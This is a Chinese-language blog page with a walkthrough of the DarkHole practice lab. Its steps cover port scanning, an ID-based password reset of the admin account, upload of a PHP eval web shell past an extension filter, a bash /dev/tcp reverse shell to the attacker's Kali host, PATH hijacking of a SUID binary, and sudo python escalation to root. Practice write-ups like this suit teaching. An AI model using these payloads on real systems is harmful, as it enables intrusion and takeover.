@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>DarkHole | You_zip</title><meta name="keywords" content="靶场"><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DockerHolekali:192.168.174.137 给靶机生成个物理地址00:50:56:23:4C:10  信息收集主机发现arp-scan -l 发现主机  获得主机ip：192.168.174.149 端口扫描nmap -sS -sV -T4 -n -p- 192.168.174.149 参数解释：  -sS: 使用 SYN 扫描 -sV: 探测开放端口上的服务版本信息。这个选项会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DarkHole">
+<meta property="og:url" content="http://example.com/2024/04/07/DarkHole/index.html">
+<meta property="og:site_name" content="You_zip">
+<meta property="og:description" content="DockerHolekali:192.168.174.137 给靶机生成个物理地址00:50:56:23:4C:10  信息收集主机发现arp-scan -l 发现主机  获得主机ip：192.168.174.149 端口扫描nmap -sS -sV -T4 -n -p- 192.168.174.149 参数解释：  -sS: 使用 SYN 扫描 -sV: 探测开放端口上的服务版本信息。这个选项会">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg">
+<meta property="article:published_time" content="2024-04-07T12:33:33.000Z">
+<meta property="article:modified_time" content="2024-04-07T12:34:10.613Z">
+<meta property="article:author" content="Youzipii">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/04/07/DarkHole/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DarkHole',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-07 20:34:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">You_zip</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DarkHole</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-07T12:33:33.000Z" title="发表于 2024-04-07 20:33:33">2024-04-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-07T12:34:10.613Z" title="更新于 2024-04-07 20:34:10">2024-04-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DarkHole"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DockerHole"><a href="#DockerHole" class="headerlink" title="DockerHole"></a>DockerHole</h1><p><strong>kali:192.168.174.137</strong></p>
+<p><strong>给靶机生成个物理地址00:50:56:23:4C:10</strong></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407163518855.png" alt="image-20240407163518855"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>arp-scan -l 发现主机</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407163800693.png" alt="image-20240407163800693"></p>
+<p><strong>获得主机ip：192.168.174.149</strong></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.149</p>
+<p>参数解释：</p>
+<ol>
+<li><strong>-sS</strong>: 使用 SYN 扫描</li>
+<li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li>
+<li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li>
+<li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li>
+<li><strong>-p-</strong>: 扫描所有端口。</li>
+</ol>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407164135872.png" alt="image-20240407164135872"></p>
+<p>可以看到开放了两个端口</p>
+<p>22-ssh Openssh</p>
+<p>80-http apache 2.4.41</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407164518989.png" alt="image-20240407164518989"></p>
+<p>访问的同时，在后台进行目录扫描</p>
+<p>可以获得<a target="_blank" rel="noopener" href="http://192.168.174.149/upload/%E6%8E%A8%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%9C%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%87%83%E7%81%AB%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%AD%89%E3%80%82">http://192.168.174.149/upload/推测可能有文件上传漏洞，燃火右上角有一个登陆界面，可能存在弱口令，sql注入等。</a></p>
+<h3 id="登陆界面"><a href="#登陆界面" class="headerlink" title="登陆界面"></a>登陆界面</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407172106009.png" alt="image-20240407172106009"></p>
+<p>简单尝试admin:admind登陆看下返回信息有没有提示，发现没有，去注册一个试试</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407172304098.png" alt="image-20240407172304098"></p>
+<p>发现admin用户已经被注册了，后台开一个bp先爆破着，自己注册一个账号登陆上去看看有什么信息</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173200797.png" alt="image-20240407173200797"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173225389.png" alt="image-20240407173225389"></p>
+<p>可以看到，注册完有自己的信息和修改密码的功能且网址中还有个id&#x3D;2，推测id&#x3D;1为admin用户的界面，修改试下能不能访问</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173325093.png" alt="image-20240407173325093"></p>
+<p>试试抓包能不能直接修改admin的密码</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173402240.png" alt="image-20240407173402240"></p>
+<p>改成1后试试用admin登陆，可以看到登陆成功</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173449466.png" alt="image-20240407173449466"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>登陆上管理员界面后发现多了个文件上传的地方，结合前面的目录，可能 存在文件上传漏洞，先试试上传自己写的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CMD&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184027696.png" alt="image-20240407184027696"></p>
+<p>可以发现只允许上传jpg,png,gif这样的图片，试试绕过方法</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184400185.png" alt="image-20240407184400185"></p>
+<p>先试试修改类型</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184513629.png" alt="image-20240407184513629"></p>
+<p>上传一张正常的图片试试</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407185347279.png" alt="image-20240407185347279"></p>
+<p>发现文件路径，访问一下也确实能出现图片</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407185413474.png" alt="image-20240407185413474"></p>
+<p>修改下后缀试试，pphphp绕过了</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407190606652.png" alt="image-20240407190606652"></p>
+<p>但文件并没有以php的形式保留下来，作了个图片马，也不行，试试别的方法，phtml和pchar可以</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407191935091.png" alt="image-20240407191935091"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407191959674.png" alt="image-20240407191959674"></p>
+<p>下面就是寻找flag的提取过程了</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在获取到shell的基础上，我么需要反弹shell</p>
+<p>kali：nv -lvvp6666</p>
+<p>shell: bash -c ‘bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.174.137&#x2F;6666  0&gt;&amp;1’</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407194457299.png" alt="image-20240407194457299"></p>
+<h4 id="sudo-root提权"><a href="#sudo-root提权" class="headerlink" title="sudo root提权"></a>sudo root提权</h4><p>cat &#x2F;etc&#x2F;passwd 发现了john用户 在家目录下面发现了一个toto文件执行发现和id一样的功能</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407200300090.png" alt="image-20240407200300090"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407200340646.png" alt="image-20240407200340646"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">id</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="built_in">id</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp;<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">cd</span> /home/john</span><br><span class="line">./toto</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201525851.png" alt="image-20240407201525851"></p>
+<p>然后现在我们再次执行就可以查看账号和密码文件了 直接使用<code>SSH</code>进行连接：<code>john/root123</code></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201629653.png" alt="image-20240407201629653"></p>
+<p><strong>ssh <a href="mailto:&#106;&#111;&#104;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x37;&#x34;&#46;&#x31;&#x34;&#x39;">&#106;&#111;&#104;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x37;&#x34;&#46;&#x31;&#x34;&#x39;</a></strong></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201814765.png" alt="image-20240407201814765"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; &gt; file.py</span><br><span class="line">cat file.py</span><br><span class="line">sudo python3 /home/john/file.py</span><br><span class="line">输入密码root123</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407202419380.png" alt="image-20240407202419380"></p>
+<p>直接执行好像是不能提权的</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407203015057.png" alt="image-20240407203015057"></p>
+<p>但他对file.py这个文件是有执行权限的，所以从这一点出发，所以才要把语句写到文件里。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/07/DarkHole/">http://example.com/2024/04/07/DarkHole/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/10/DC-3/"><img class="prev-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DC-3</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/23/CRC-32/"><img class="next-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CRC-32</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Ai-web1通关记录"><img class="cover" src="/null" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">Ai-web1通关记录</div></div></a></div><div><a href="/2024/03/20/DC-1/" title="DC-1"><img class="cover" src="/null" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-1</div></div></a></div><div><a href="/2024/03/20/DC-2/" title="DC-2"><img class="cover" src="/null" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-2</div></div></a></div><div><a href="/2024/04/10/DC-3/" title="DC-3"><img class="cover" src="/null" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-10</div><div class="title">DC-3</div></div></a></div><div><a href="/2024/04/26/Load-Of-The-Root/" title="Load Of The Root"><img class="cover" src="/null" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-26</div><div class="title">Load Of The Root</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Youzipii" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Practice makes perfect.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DockerHole"><span class="toc-number">1.</span> <span class="toc-text">DockerHole</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2"><span class="toc-number">1.1.4.</span> <span class="toc-text">登陆界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo-root%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">sudo root提权</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/" title="应急响应靶场-zgsf-web1">应急响应靶场-zgsf-web1</a><time datetime="2024-08-06T04:36:01.000Z" title="发表于 2024-08-06 12:36:01">2024-08-06</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/04/OSCP-005-Broken/" title="OSCP-005-Broken">OSCP-005-Broken</a><time datetime="2024-08-04T07:57:08.000Z" title="发表于 2024-08-04 15:57:08">2024-08-04</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/01/OSCP-004-Matrix/" title="OSCP-004-Matrix">OSCP-004-Matrix</a><time datetime="2024-08-01T12:21:41.000Z" title="发表于 2024-08-01 20:21:41">2024-08-01</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/07/23/weblogic/" title="weblogic">weblogic</a><time datetime="2024-07-23T06:48:31.000Z" title="发表于 2024-07-23 14:48:31">2024-07-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/" title="简易爆破poc">简易爆破poc</a><time datetime="2024-07-21T07:22:48.000Z" title="发表于 2024-07-21 15:22:48">2024-07-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
